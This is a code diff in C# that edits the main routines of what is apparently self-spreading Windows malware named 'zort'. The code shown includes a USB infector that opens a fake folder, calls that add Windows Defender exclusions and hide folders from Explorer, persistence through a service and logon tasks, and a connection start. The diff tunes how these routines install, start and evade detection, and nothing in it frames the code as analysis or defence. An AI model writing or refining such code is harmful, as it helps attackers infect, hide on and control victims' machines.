@@ -101,6 +101,13 @@ namespace zort
         private void UsbRoutine()
         {
             RemovableInfector.OpenFakeFolderIfRunningFromInfectedUsb();
+
+            if(ServiceHelper.IsServiceInstalled())
+            {
+                Exit();
+                return;
+            }
+
             if (PookieHelper.PookieExists())
             {
                 if (!PookieHelper.IsPookieRunning())
@@ -129,6 +136,7 @@ namespace zort
             if (ElevationHelper.IsElevated())
             {
                 AntiDetection.AddDefenderExclusions();
+                AntiDetection.HideHiddenFoldersFromExplorer();
                 if (ServiceHelper.IsServiceInstalled())
                 {
                     if (!ServiceHelper.IsServiceRunning()) ServiceHelper.StartService();
@@ -144,7 +152,9 @@ namespace zort
                 if (PookieHelper.Tasks.StartAtLogon.Exists()) PookieHelper.Tasks.StartAtLogon.Remove();
                 if (PookieHelper.Tasks.DeleteAtNextLogon.Exists()) PookieHelper.Tasks.DeleteAtNextLogon.Remove();
                 PookieHelper.Tasks.DeleteAtNextLogon.Create();
-                Util.RestartComputer();
+                //Util.RestartComputer();
+                Thread.Sleep(100);
+                ServiceHelper.StartService();
                 Exit();
                 return;
             }
@@ -160,7 +170,6 @@ namespace zort
 
         private void ServiceRoutine()
         {
-            NativeMethods.MakeProcessCritical();
             AntiDetection.AddDefenderExclusions();
             AntiDetection.HideHiddenFoldersFromExplorer();
             conn.Start();
